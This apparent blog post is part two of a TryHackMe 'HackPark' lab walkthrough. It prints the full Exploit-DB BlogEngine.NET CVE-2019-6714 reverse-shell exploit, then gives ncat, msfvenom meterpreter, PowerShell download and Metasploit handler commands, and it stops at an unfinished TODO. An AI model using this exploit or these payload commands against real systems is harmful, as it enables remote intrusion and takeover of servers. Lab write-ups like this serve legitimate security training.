---
title: THM Room Walkthrough - HackPark Part 2
date: '2025-02-02 10:34:56 +0000'
author: b3rdma
categories:
  - Hacking
  - Try Hack Me
tags:
  - metasploit
  - enumeration
  - exploit-db
  - winpeas
description: Part two of the THM room HackPark walkthrough.
media_subpath: /img/hackpark/
published: null
---
# Part 2

## Contents

### Table of contents

<!-- toc -->

- [Task 3 - Compromise the machine](#task-3---compromise-the-machine)
  * [Get the exploit](#get-the-exploit)
  * [Upload the exploit](#upload-the-exploit)
  * [Initial reverse shell](#initial-reverse-shell)
- [Task 4 and 5 - Windows Privilege Escalation](#task-4-and-5---windows-privilege-escalation)
  * [Metasploit and winPEAS](#metasploit-and-winpeas)
  * [Msfvenom](#msfvenom)

<!-- tocstop -->

## Task 3 - Compromise the machine

To continue where we left off, I had answered all the questions of Task 3 but
did not actually upload the exploit to the target machine and run the exploit to
get the answer to question 3. Here we go...

### Get the exploit

We need to download the exploit from the
[Exploit-DB](https://www.exploit-db.com/exploits/46353) (CVE-2019-6714). The code
for that is as follows:

```shell
# Exploit Title: BlogEngine.NET <= 3.3.6 Directory Traversal RCE
# Date: 02-11-2019
# Exploit Author: Dustin Cobb
# Vendor Homepage: https://github.com/rxtur/BlogEngine.NET/
# Software Link: https://github.com/rxtur/BlogEngine.NET/releases/download/v3.3.6.0/3360.zip
# Version: <= 3.3.6
# Tested on: Windows 2016 Standard / IIS 10.0
# CVE : CVE-2019-6714

/*
 * CVE-2019-6714
 *
 * Path traversal vulnerability leading to remote code execution.  This
 * vulnerability affects BlogEngine.NET versions 3.3.6 and below.  This
 * is caused by an unchecked "theme" parameter that is used to override
 * the default theme for rendering blog pages.  The vulnerable code can
 * be seen in this file:
 *
 * /Custom/Controls/PostList.ascx.cs
 *
 * Attack:
 *
 * First, we set the TcpClient address and port within the method below to
 * our attack host, who has a reverse tcp listener waiting for a connection.
 * Next, we upload this file through the file manager.  In the current (3.3.6)
 * version of BlogEngine, this is done by editing a post and clicking on the
 * icon that looks like an open file in the toolbar.  Note that this file must
 * be uploaded as PostView.ascx. Once uploaded, the file will be in the
 * /App_Data/files directory off of the document root. The admin page that
 * allows upload is:
 *
 * http://10.10.10.10/admin/app/editor/editpost.cshtml
 *
 *
 * Finally, the vulnerability is triggered by accessing the base URL for the
 * blog with a theme override specified like so:
 *
 * http://10.10.10.10/?theme=../../App_Data/files
 *
 */

<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>

<script runat="server">
  static System.IO.StreamWriter streamWriter;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);

  using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.11.121.104", 4445)) {
    using(System.IO.Stream stream = client.GetStream()) {
      using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
        streamWriter = new System.IO.StreamWriter(stream);

        StringBuilder strInput = new StringBuilder();

        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.CreateNoWindow = true;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.RedirectStandardError = true;
        p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
        p.Start();
        p.BeginOutputReadLine();

        while(true) {
          strInput.Append(rdr.ReadLine());
          p.StandardInput.WriteLine(strInput);
          strInput.Remove(0, strInput.Length);
        }
      }
    }
      }
    }

    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
    StringBuilder strOutput = new StringBuilder();

        if (!String.IsNullOrEmpty(outLine.Data)) {
          try {
                  strOutput.Append(outLine.Data);
                      streamWriter.WriteLine(strOutput);
                      streamWriter.Flush();
                } catch (Exception err) { }
        }
    }

</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>
```

{: file="~/Downloads/PostView.ascx" }

### Upload the exploit

Note the details in the instructions; we must upload the file as PostView.ascx
and it tells us where to upload the file. Upload the file as instructed:

![exploit upload](hackpark-exploit-upload.webp){: width="700"
height="400" }
_Upload of the exploit_

Once the exploit file is uploaded, we follow the instructions to trigger the
reverse shell once we have set up a listener.

> I have had issues in the past with netcat,
> `nc`, not working correctly when used as a listener on MacOS. I used NMAP's version, `ncat`, which works.
> {: .prompt-info }

Making sure the same port is used as we entered in to the exploit:

```bash
ncat -nvlp 4445
```

{: .nolineno }

### Initial reverse shell

Once we have the listener up and running, navigate to the page in the exploit
instructions and the connection will happen. Once the initial reverse shell is
active, run the `whoami` command to get the answer to question 3 the right way,
as per the screenshot below:

![initial reverse shell exploit](hackpark-revshell-exploit.webp){: width="700"
height="400" }
_Reverse shell established and `whoami` command executed_

Now we can hold our head up high and move on to Task 4 and 5.

## Task 4 and 5 - Windows Privilege Escalation

### Metasploit and winPEAS

This room is quite different in that Task 4 and Task 5 are pretty much the same
task just using different methods. Task 4 is very much Metasploit focused and
has the Metasploit framework suggest vulnerabilities to exploit; whereas Task 5
is a bit more hands on and uses
[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat) to identify vulnerabilities. For the
sake of brevity I shall focus on using Metasploit to establish a Meterpreter
whilst using winPEAS to find the vulnerable services to be exploited.

> I initially used the winPEASx64.exe files to find the vulnerabilities and it
> wasn't until the final question that I noticed I could not find the answer. It
> turns out that, in this case at least, winPEAS.bat provides us with a bit more
> detail and only then can we answer the final question. Use the .bat file on
> this machine.
> {: .prompt-tip }

### Msfvenom

We currently only have a weak shell connection with many limitations. We can use
`msfvenom` to create a payload, use a simple http server to serve the payload
and use the current weak shell to get the payload on to the target machine. The
process goes something like this:

- Crate the payload with msfvenom:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.121.104 LPORT=4446 -e x86/shikata_ga_nai -f exe -o reverse.exe
```

{: .nolineno }

- Serve the file using a simple http server:

```bash
python3 -m http.server 80
```

{: .nolineno }

- Use the current shell to download the payload, reverse.exe:

```shell
powershell -c wget "http://10.11.121.104/reverse.exe" -outfile "reverse.exe"
```

{: .nolineno }

- Before executing the payload on the target machine, we need to set up a
  meterpreter listener that will establish a stable reverse shell:

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.11.121.104
set LPORT 4446
run
```

Those steps can be seen in the screenshot below:

![payload created and uploaded to the target
machine](hackpark-revshell-uploaded-to-vm.webp){: width="700" height="400" }

There are a few hints within the room, for example letting us know that
`c:\windows\Temp` is a good place to upload the payload to and it is exactly
where I uploaded reverse.exe with success.

###

<!-- TODO: Finish the write up -->

